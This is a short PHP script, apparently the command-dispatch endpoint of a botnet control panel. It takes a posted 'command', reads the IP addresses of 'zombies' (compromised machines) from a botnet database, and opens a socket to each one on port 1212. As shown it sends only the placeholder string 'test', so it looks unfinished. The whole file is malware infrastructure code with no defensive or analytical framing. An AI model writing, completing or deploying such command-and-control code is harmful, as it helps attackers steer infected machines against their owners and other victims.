<?php 
    if($_SERVER['REQUEST_METHOD'] == 'POST'){
        $port = 1212;
        $command = $_POST['command'];
        $db = new PDO('sqlite:/var/www/html/C2WebServer/botnet.db');
        $stmt = $db->query("SELECT ip FROM zombies");
        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $ip = $row['ip'];
            $socket = fsockopen($ip, $port, $errno, $errstr, 30);
            Header("Location: ../../C2WebServer/index.php");
            if (!$socket) {
                // status = 'Offline';
            } else {
                $data = 'test';
                fwrite($socket, $data);
                $response = fread($socket, 1024);
                fclose($socket);
                Header("Location: ../../C2WebServer/index.php");
            }
        }
    }
?>